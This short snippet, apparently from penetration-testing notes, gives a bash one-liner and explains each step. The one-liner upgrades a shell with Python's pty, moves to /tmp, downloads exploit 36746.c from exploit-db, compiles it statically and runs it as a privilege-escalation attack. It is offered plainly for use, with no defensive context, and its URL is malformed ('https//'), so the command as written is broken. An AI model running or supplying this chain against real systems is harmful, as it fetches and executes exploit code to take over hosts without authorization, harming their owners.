``` bash
python -c 'import pty;pty.spawn("/bin/bash")' && cd /tmp && wget https//www.exploit-db.com/download/36746.c && gcc 36746.c -o access -static && ./access
```

This command does the following:

- Spawns a new bash shell using Python.
- Changes the directory to /tmp.
- Downloads an exploit from https//www.exploit-db.com/download/36746.c.
- Compiles the downloaded exploit into an executable named access.
- Executes the access executable, which triggers the exploit.
